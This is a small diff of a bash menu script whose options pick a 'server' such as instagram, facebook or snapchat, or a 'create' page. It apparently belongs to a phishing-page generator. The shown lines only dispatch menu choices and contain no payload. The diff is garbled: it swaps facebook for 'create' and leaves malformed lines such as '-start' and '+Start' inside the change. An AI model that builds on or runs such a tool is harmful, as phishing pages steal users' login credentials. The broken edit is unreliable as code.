@@ -44,8 +44,9 @@ server="instagram"
 start
 
 elif [[ $option == 2 ]]; then
-server="facebook"
-start
+server="create"
+-start
++Start
 elif [[ $option == 3 ]]; then
 server="snapchat"
 start
@@ -186,7 +187,8 @@ start
 elif [[ $option == 38 ]]; then
 server="create"
 createpage
-start
+start 
+
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
